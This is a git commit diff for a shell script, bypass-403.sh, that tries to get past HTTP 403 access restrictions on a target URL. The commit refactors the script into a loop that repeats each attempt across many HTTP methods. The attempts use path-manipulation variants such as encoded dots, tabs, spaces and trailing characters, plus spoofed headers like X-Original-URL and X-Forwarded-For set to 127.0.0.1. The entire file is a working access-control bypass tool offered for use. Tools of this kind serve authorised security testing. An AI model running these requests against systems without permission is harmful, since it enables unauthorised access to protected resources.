e29829c9554d1b4f5ca4750cca9ae53dbc4a438e
Kirill Zhdanov <storenth@yandex.ru>
2021-07-12 23:09:15 +0700

    implement function to call fuzzer

--- bypass-403.sh
+++ bypass-403.sh
@@ -10,40 +10,35 @@ if [ $# -eq 1 ]; then
     checkhelp "$@" 
 fi
 # alias
-curlrequest='curl -k -s -o /dev/null -iL -w "status:%{http_code}","size:%{size_download}"'
+CURLREQUEST='curl -k -s --max-time 2 -o /dev/null -iL -w [%{http_code}]'
+
+# echo {GET,POST,PUT,TRACE} | xargs -n1 -I {} $CURLREQUEST -X {} $1/$2
+requestfuzzer(){
+    for REQ in GET POST PUT CONNECT PATCH OPTIONS HEAD TRACE TRACK
+    do
+        $CURLREQUEST -X $REQ "$@"
+        echo -n " $REQ --> $@"
+        echo
+    done
+}
 
 # path fuzzing
-$curlrequest $1/$2
-echo "  --> ${1}/${2}"
-$curlrequest $1/%2e/$2
-echo "  --> ${1}/%2e/${2}"
-$curlrequest $1/$2/.
-echo "  --> ${1}/${2}/."
-$curlrequest $1//$2//
-echo "  --> ${1}//${2}//"
-$curlrequest $1/./$2/./
-echo "  --> ${1}/./${2}/./"
-$curlrequest $1/$2%20
-echo "  --> ${1}/${2}%20"
-$curlrequest $1/$2%09
-echo "  --> ${1}/${2}%09"
-$curlrequest $1/$2?
-echo "  --> ${1}/${2}?"
-$curlrequest $1/$2.html
-echo "  --> ${1}/${2}.html"
-$curlrequest $1/$2/?anything
-echo "  --> ${1}/${2}/?anything"
-$curlrequest $1/$2#
-echo "  --> ${1}/${2}#"
+requestfuzzer "$1/$2"
+requestfuzzer $1/%2e/$2
+requestfuzzer $1/$2/.
+requestfuzzer $1//$2//
+requestfuzzer $1/./$2/./
+requestfuzzer $1/$2%20
+requestfuzzer $1/$2%09
+requestfuzzer $1/$2?
+requestfuzzer $1/$2.html
+requestfuzzer $1/$2/?anything
+requestfuzzer $1/$2#
 
 # headers fuzzing
-$curlrequest -H "X-Original-URL: $2" $1/$2
-echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
-$curlrequest -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
-echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
-$curlrequest -H "X-Forwarded-For: http://127.0.0.1" $1/$2
-echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
-$curlrequest -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
-echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
-$curlrequest -H "X-rewrite-url: $2" $1
-echo "  --> ${1} -H X-rewrite-url: ${2}"
+requestfuzzer -H "X-Original-URL: $2" $1/
+requestfuzzer -H "X-Original-URL: $2" $1/$2
+requestfuzzer -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
+requestfuzzer -H "X-Forwarded-For: http://127.0.0.1" $1/$2
+requestfuzzer -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
+requestfuzzer -H "X-rewrite-url: $2" $1
